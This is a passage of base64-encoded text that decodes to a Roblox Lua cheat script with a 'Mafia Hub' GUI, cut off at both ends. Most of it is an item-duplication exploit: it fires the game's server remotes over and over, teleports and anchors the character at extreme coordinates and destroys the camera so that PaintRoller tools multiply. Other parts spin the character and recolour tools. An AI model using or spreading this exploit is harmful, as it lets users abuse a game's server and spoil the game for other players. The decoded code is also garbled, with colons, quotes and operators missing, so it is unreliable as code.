AgICAgICAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gUGFpbnRSb2xsZXIgdGhlbiAgCiAgICAgICAgICAgICAgICBjaGFuZ2VBbmltYXRpb24odG9vbCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIAogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIgb3IgcGxheWVyLkNoYXJhY3RlckFkZGVkV2FpdCgpICAKICAgICAgICBmb3IgXywgdG9vbCBpbiBpcGFpcnMoY2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8gIAogICAgICAgICAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gUGFpbnRSb2xsZXIgdGhlbiAgCiAgICAgICAgICAgICAgICBjaGFuZ2VBbmltYXRpb24odG9vbCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgZW5kCiAgICAKICAgIEVxdWlwRXZlcnl0aGluZygpCiAgICB3YWl0KDEpCiAgICBFcXVpcEV2ZXJ5dGhpbmcoKQogICAgd2FpdCgxKQogICAgRXF1aXBFdmVyeXRoaW5nKCkKICAgIAogICAgZnVuY3Rpb24gc3RhcnRTcGluKCkKICAgICAgICBsb2NhbCBQbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoUGxheWVycykKICAgICAgICBsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZUdldFNlcnZpY2UoUnVuU2VydmljZSkKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkKICAgICAgICBsb2NhbCByb290UGFydCA9IGNoYXJhY3RlcldhaXRGb3JDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgICAgIAogICAgICAgIHRhc2sud2FpdCgxKSAgCiAgICAgICAgCiAgICAgICAgbG9jYWwgc3BpblNwZWVkID0gbWF0aC5yYWQoMTc1MCkgCiAgCiAgICAgICAgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkQ29ubmVjdChmdW5jdGlvbihkdCkgIAogICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSByb290UGFydC5DRnJhbWUgIENGcmFtZS5BbmdsZXMoMCwgc3BpblNwZWVkICBkdCwgMCkgIAogICAgICAgIGVuZCkKICAgICAgICAKICAgIGVuZAogICAgCiAgICBzdGFydFNwaW4oKQplbmQKICAgIGVuZAp9KQoKVG9vbHNUYWJBZGRCdXR0b24oewogICAgTmFtZSA9IENvbG9yIE1hcCBTa3kgW1ZlcnkgT1BdLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICBsb2NhbCB0b29sc2VsZWN0ZWQgPSBQYWludFJvbGxlcgpsb2NhbCBkdXBlYW1vdCA9IDEwMApsb2NhbCBwaWNrdG9vbHJlbW90ZSA9IGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFUb28xbCkKbG9jYWwgY2xlYXJ0b29scmVtb3RlID0gZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpLlJFRmluZEZpcnN0Q2hpbGQoMUNsZWExclRvb2wxcykKbG9jYWwgZHVwaW5nID0gdHJ1ZQpsb2NhbCBvbGRjZiA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKCgpsb2NhbCBHcmlwUG9zVGFibGUgPSB7fQpmb3IgaSA9IDEsIDEwMCBkbwogICAgaWYgaSA9PSAxIHRoZW4KICAgICAgICB0YWJsZS5pbnNlcnQoR3JpcFBvc1RhYmxlLCBWZWN0b3IzLm5ldygyLCA1MCwgLTUwKSkgCiAgICBlbHNlCiAgICAgICAgdGFibGUuaW5zZXJ0KEdyaXBQb3NUYWJsZSwgVmVjdG9yMy5uZXcoKGkgLSAxKSAgMiwgNTAsIC01MCkpIAogICAgZW5kCmVuZAoKbG9jYWwgdG9vbENvdW50ID0gMApmb3IgXywgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgaWYgdG9vbElzQShUb29sKSBhbmQgdG9vbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgdG9vbENvdW50ID0gdG9vbENvdW50ICsgMQogICAgZW5kCmVuZApmb3IgXywgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgIGlmIHRvb2xJc0EoVG9vbCkgYW5kIHRvb2wuTmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgIHRvb2xDb3VudCA9IHRvb2xDb3VudCArIDEKICAgIGVuZAplbmQKCmlmIHRvb2xDb3VudCA9IGR1cGVhbW90IHRoZW4KICAgIC0tIFVuZXF1aXBzIGFuZCBtb3ZlcyB0aGUgdG9vbHMgdG8gdGhlIGRlZmluZWQgcG9zaXRpb25zCiAgICBmb3IgaSwgdG9vbCBpbiBwYWlycyhnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2sKICAgICAgICBlbmQKICAgIGVuZAogICAgZm9yIGksIHRvb2wgaW4gcGFpcnMoZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sSXNBKFRvb2wpIGFuZCB0b29sLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGxvY2FsIGdyaXBQb3NJbmRleCA9IG1hdGgubWluKGksICNHcmlwUG9zVGFibGUpCiAgICAgICAgICAgIGxvY2FsIGdyaXBQb3MgPSBHcmlwUG9zVGFibGVbZ3JpcFBvc0luZGV4XQogICAgICAgICAgICB0b29sLkdyaXBQb3MgPSBncmlwUG9zCiAgICAgICAgZW5kCiAgICBlbmQKZWxzZQogICAgCiAgICBsb2NhbCBhcmdzID0gewogICAgICAgIFsxXSA9IENsZWFyQWxsVG9vbHMKICAgIH0KICAgIAogICAgZ2FtZUdldFNlcnZpY2UoUmVwbGljYXRlZFN0b3JhZ2UpV2FpdEZvckNoaWxkKFJFKVdhaXRGb3JDaGlsZCgxQ2xlYTFyVG9vbDFzKUZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgCiAgICB3YWl0KDAuMikKICAgIAogICAgZ2FtZUdldFNlcnZpY2UoU3RhcnRlckd1aSlTZXRDb3JlKFNlbmROb3RpZmljYXRpb24sIHsKICAgICAgICBUaXRsZSA9IE1hZmlhIEh1YiBEdXBlLAogICAgICAgIFRleHQgPSBEb24ndCBjbGljayBvbiBhbnl0aGluZyB3aGlsZSB0aGUgdG9vbHMgYXJlIGJlaW5nIGR1cGVkLAogICAgICAgIEJ1dHRvbjEgPSBHb3QgaXQsCiAgICAgICAgRHVyYXRpb24gPSAzCiAgICB9KQogICAgCiAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWQuU2l0ID0gZmFsc2UKICAgIGVuZAogICAgCiAgICB3YWl0KDAuMSkKICAgIAogICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFdvcmtzcGFjZSlGaW5kRmlyc3RDaGlsZChDYW1lcmEpRGVzdHJveSgpCiAgICBlbmQKICAgIAogICAgZm9yIG0gPSAxLCAyIGRvCiAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyg5OTk5OTk5OTkuNDE0LCAtNDkwLCA5OTk5OTk5OTkuNDE0LCAwLjk3NDM2MDQwNiwgLTAuMTc1NzM0MDg4LCAwLjE0MDQ5NzYxLCAtMC4xMzM0NDE0MDQsIDAuMDUxNDA1MzA2OSwgMC45ODk3MjI3MjksIC0wLjE4MTE1MDMwMiwgLTAuOTgzMDk0NjkyLCAwLjAyNjYzNzA5MjIpCiAgICBlbmQKICAgIAogICAgdGFzay53YWl0KDAuMikKICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IHRydWUKICAgIHdhaXQoMC41KQogICAgCiAgICBmb3IgYWlkaiwgYWZoIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgbm90IGFmaC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIGlmIGFmaElzQShUb29sKSB0aGVuCiAgICAgICAgICAgICAgICBhZmguUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGZvciBhaWVmaGlld2h3ZiwgZHZqYnZqIGluIHBhaXJzKGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBkdmpidmpJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICBpZiBub3QgZHZqYnZqLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIGR2amJ2akRlc3Ryb3koKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgdHRqdGp1dGp1dGpqdGosIGRkdmR2ZHN2ZGZicm55dHl0bXZkdiBpbiBwYWlycyhnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIGRkdmR2ZHN2ZGZicm55dHl0bXZkdklzQShUb29sKSB0aGVuCiAgICAgICAgICAgIGlmIG5vdCBkZHZkdmRzdmRmYnJueXR5dG12ZHYubmFtZSA9PSB0b29sc2VsZWN0ZWQgdGhlbgogICAgICAgICAgICAgICAgZGR2ZHZkc3ZkZmJybnl0eXRtdmR2RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGZvciBmaW5kaW4sIHRvb2xsZWwgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiB0b29sbGVsSXNBKFRvb2wpIHRoZW4KICAgICAgICAgICAgaWYgdG9vbGxlbC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSB0cnVlCiAgICAgICAgICAgICAgICBmb3IgYmFzYywgYWlqZncgaW4gcGFpcnModG9vbGxlbEdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgYWlqZncuTmFtZSA9PSBIYW5kbGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBhaWpmdy5OYW1lID0gSOKlYeKlbuKlZOKlbOKlZQogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGVsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgdG9sbGxhaGhoaCA9IHRvb2xsZWwKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBmb3IgZmlpZmksIHRvb2xsbGwgaW4gcGFpcnMoZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbwogICAgICAgIGlmIHRvb2xsbGxJc0EoVG9vbCkgdGhlbgogICAgICAgICAgICBpZiB0b29sbGxsLk5hbWUgPT0gdG9vbHNlbGVjdGVkIHRoZW4KICAgICAgICAgICAgICAgIHRvb2xsbGxmb3VuID0gdHJ1ZQogICAgICAgICAgICAgICAgZm9yIG5hbmEsIGpqc2pzaiBpbiBwYWlycyh0b29sbGxsR2V0RGVzY2VuZGFudHMoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiBqanNqc2ouTmFtZSA9PSBIYW5kbGUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGpqc2pzai5OYW1lID0gSOKlYeKlbuKlZOKlbOKlZQogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICB0b29sbGxsLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgdG9vbGxsZmZlbCA9IHRvb2xsbGwKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGlmIHRvb2xsbGxmb3VuID09IHRydWUgdGhlbgogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwgdGhlbgogICAgICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICAgICAgZW5kCiAgICAgICAgcmVwZWF0CiAgICAgICAgICAgIHdhaXQoKQogICAgICAgIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b29sbGxmZmVsKSA9PSBuaWwKICAgICAgICB0b29sbGxsZm91biA9IGZhbHNlCiAgICBlbmQKICAgIAogICAgaWYgdG9vbGxsbGZvdW4yID09IHRydWUgdGhlbgogICAgICAgIGlmIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZCh0b2xsbGxhaGhoaCkgPT0gbmlsIHRoZW4KICAgICAgICAgICAgdG9vbGxsbGZvdW4yID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICByZXBlYXQKICAgICAgICAgICAgd2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvbGxsbGFoaGhoKSA9PSBuaWwKICAgICAgICB0b29sbGxsZm91bjIgPSBmYWxzZQogICAgZW5kCiAgICAKICAgIHdhaXQoMC4xKQogICAgCiAgICBmb3IgbSA9IDEsIGR1cGVhbW90IGRvCiAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICBnYW1lR2V0U2VydmljZShXb3Jrc3BhY2UpRmluZEZpcnN0Q2hpbGQoQ2FtZXJhKURlc3Ryb3koKQogICAgICAgIGVuZAogICAgICAgIGlmIG0gPSBkdXBlYW1vdCB0aGVuCiAgICAgICAgZWxzZWlmIG0gPT0gZHVwZWFtb3Qgb3IgbSA9IGR1cGVhbW90IC0gMSB0aGVuCiAgICAgICAgZW5kCiAgICAgICAgbG9jYWwgYXJncyA9IHsKICAgICAgICAgICAgWzFdID0gUGlja2luZ1Rvb2xzLAogICAgICAgICAgICBbMl0gPSB0b29sc2VsZWN0ZWQKICAgICAgICB9CiAgICAgICAgcGlja3Rvb2xyZW1vdGVJbnZva2VTZXJ2ZXIodW5wYWNrKGFyZ3MpKQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkJhY2twYWNrV2FpdEZvckNoaWxkKHRvb2xzZWxlY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGlmIGR1cGluZyA9PSBmYWxzZSB0aGVuCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIHdhaXQoKQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3Rlclt0b29sc2VsZWN0ZWRdRmluZEZpcnN0Q2hpbGQoSGFuZGxlKS5OYW1lID0gSOKlYeKlbuKlZOKlbOKlZQogICAgICAgIGdhbWVHZXRTZXJ2aWNlKFBsYXllcnMpLkxvY2FsUGxheWVyLkNoYXJhY3RlckZpbmRGaXJzdENoaWxkKHRvb2xzZWxlY3RlZCkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQmFja3BhY2tGaW5kRmlyc3RDaGlsZCh0b29sc2VsZWN0ZWQpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBnYW1lR2V0U2VydmljZShTdGFydGVyR3VpKVNldENvcmUoU2VuZE5vdGlmaWNhdGlvbiwgewogICAgICAgICAgICBUaXRsZSA9IE1hZmlhIEh1YiBUb29sLAogICAgICAgICAgICBUZXh0ID0gVG9vbCBEdXBlZCAgLi4gbSAuLiAgICAuLiBkdXBlYW1vdCwKICAgICAgICAgICAgRHVyYXRpb24gPSAxCiAgICAgICAgfSkKICAgICAgICByZXBlYXQKICAgICAgICAgICAgaWYgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSkgdGhlbgogICAgICAgICAgICAgICAgZ2FtZUdldFNlcnZpY2UoV29ya3NwYWNlKUZpbmRGaXJzdENoaWxkKENhbWVyYSlEZXN0cm95KCkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgdW50aWwgZ2FtZUdldFNlcnZpY2UoUGxheWVycykuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQodG9vbHNlbGVjdGVkKSA9PSBuaWwKICAgIGVuZAogICAgCiAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQW5jaG9yZWQgPSBmYWxzZQogICAgcmVwZWF0CiAgICAgICAgd2FpdCgpCiAgICB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoSHVtYW5vaWRSb290UGFydCkgPT0gbmlsCiAgICByZXBlYXQKICAgICAgICB3YWl0KCkKICAgIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIdW1hbm9pZFJvb3RQYXJ0KQogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmCiAgICAKICAgIGZvciB6LCB4IGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgeC5OYW1lID09IHRvb2xzZWxlY3RlZCB0aGVuCiAgICAgICAgICAgIHRvb2xhbW91dGggPSB6CiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgd2FpdCgpCiAgICBkdXBpbmcgPSBmYWxzZQogICAgd2FpdCgwLjEpCiAgICAKICAgIGZvciBpLCB0b29sIGluIHBhaXJzKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja0dldENoaWxkcmVuKCkpIGRvCiAgICAgICAgaWYgdG9vbElzQShUb29sKSB0aGVuCiAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICBsb2NhbCBncmlwUG9zSW5kZXggPSBtYXRoLm1pbihpLCAjR3JpcFBvc1RhYmxlKQogICAgICAgICAgICBsb2NhbCBncmlwUG9zID0gR3JpcFBvc1RhYmxlW2dyaXBQb3NJbmRleF0KICAgICAgICAgICAgaWYgdG9vbElzRGVzY2VuZGFudE9mKGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIpIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuR3JpcFBvcyA9IGdyaXBQb3MKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgd2FybihUb29sLCB0b29sLk5hbWUsIGlzIG5vdCBpbiBjaGFyYWN0ZXIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIHdhaXQoMSkKICAgIAogICAgZnVuY3Rpb24gRXF1aXBFdmVyeXRoaW5nKCkKICAgICAgICAKICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllcgogICAgICAgIAogICAgICAgIAogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGlmIHRvb2xGaW5kRmlyc3RDaGlsZChDeWNsZU5leHRBbmltYXRpb24pIHRoZW4gIAogICAgICAgICAgICAgICAgdG9vbC5DeWNsZU5leHRBbmltYXRpb25GaXJlU2VydmVyKCkgIAogICAgICAgICAgICBlbmQgIAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIAogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhwbGF5ZXIuQmFja3BhY2tHZXRDaGlsZHJlbigpKSBkbyAgCiAgICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgYW5kIHRvb2wuTmFtZSA9PSBQYWludFJvbGxlciB0aGVuICAKICAgICAgICAgICAgICAgIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWRXYWl0KCkgIAogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhjaGFyYWN0ZXJHZXRDaGlsZHJlbigpKSBkbyAgCiAgICAgICAgICAgIGlmIHRvb2xJc0EoVG9vbCkgYW5kIHRvb2wuTmFtZSA9PSBQYWludFJvbGxlciB0aGVuICAKICAgICAgICAgICAgICAgIGNoYW5nZUFuaW1hdGlvbih0b29sKSAgCiAgICAgICAgICAgIGVuZCAgCiAgICAgICAgZW5kCiAgICAgICAgCiAgICBlbmQKICAgIAogICAgRXF1aXBFdmVyeXRoaW5nKCkKICAgIHdhaXQoMSkKICAgIEVxdWlwRXZlcnl0aGluZygpCiAgICB3YWl0KDEpCiAgICBFcXVpcEV2ZXJ5dGhpbmcoKQogICAgCiAgICBmdW5jdGlvbiBzdGFydFNwaW4oKQogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKQogICAgICAgIGxvY2FsIFJ1blNlcnZpY2UgPSBnYW1lR2V0U2VydmljZShSdW5TZXJ2aWNlKQogICAgICAgIGxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyIG9yIHBsYXllci5DaGFyYWN0ZXJBZGRlZFdhaXQoKQogICAgICAgIGxvY2FsIHJvb3RQYXJ0ID0gY2hhcmFjdGVyV2FpdEZvckNoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgCiAgICAgICAgdGFzay53YWl0KDEpICAKICAgICAgICAKICAgICAgICBsb2NhbCBzcGluU3BlZWQgPSBtYXRoLnJhZCgxNzUwKSAKICAKICAgICAgICBSdW5TZXJ2aWNlLlJlbmRlclN0ZXBwZWRDb25uZWN0KGZ1bmN0aW9uKGR0KSAgCiAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IHJvb3RQYXJ0LkNGcmFtZSAgQ0ZyYW1lLkFuZ2xlcygwLCBzcGluU3BlZWQgIGR0LCAwKSAgCiAgICAgICAgZW5kKQogICAgCiAgICAKICAgIGVuZAogICAgCiAgICBzdGFydFNwaW4oKSBlbmQKZW5kCn0pCi0tIFZhcmlhYmxlIHRvIHN0b3JlIHRoZSBzZWxlY3RlZCBjb2xvcgpsb2NhbCBzZWxlY3RlZENvbG9yID0gY29sb3JzVGFibGVbMV0uQ29sb3IKCi0tIEZ1bmN0aW9uIHRvIGFwcGx5IHRoZSBzZWxlY3RlZCBjb2xvcgpsb2NhbCBmdW5jdGlvbiBhcHBseVNlbGVjdGVkQ29sb3IoKQogICAgbG9jYWwgTG9jYWxQbGF5ZXIgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKS5Mb2NhbFBsYXllcgogICAgbG9jYWwgYmFja3BhY2sgPSBMb2NhbFBsYXllci5CYWNrcGFjawogICAgbG9jYWwgY2hhcmFjdGVyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCBhcmdzID0ge3NlbGVjdGVkQ29sb3J9CgogICAgbG9jYWwgZnVuY3Rpb24gY2hhbmdlVG9vbENvbG9yKHRvb2wpCiAgICAgICAgaWYgdG9vbElzQShUb29sKSBhbmQgdG9vbC5OYW1lID09IFBhaW50Um9sbGVyIHRoZW4KICAgICAgICAgICAgbG9jYWwgU2V0Q29sb3IgPSB0b29sRmluZEZpcnN0Q2hpbGQoU2V0Q29sb3IsIHRydWUpCiAgICAgICAgICAgIGlmIFNldENvbG9yIHRoZW4KICAgICAgICAgICAgICAgIFNldENvbG9yRmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBjaGFuZ2VUb29sQ29sb3IodG9vbCkKICAgIGVuZAogICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGNoYXJhY3RlckdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgY2hhbmdlVG9vbENvbG9yKHRvb2wpCiAgICBlbmQKZW5kCgotLSBGdW5jdGlvbiB0byBlcXVpcCBhbmQgdW5lcXVpcCB0b29scwpsb2NhbCBmdW5jdGlvbiBlcXVpcEFuZFVuZXF1aXBUb29scyhjYWxsYmFj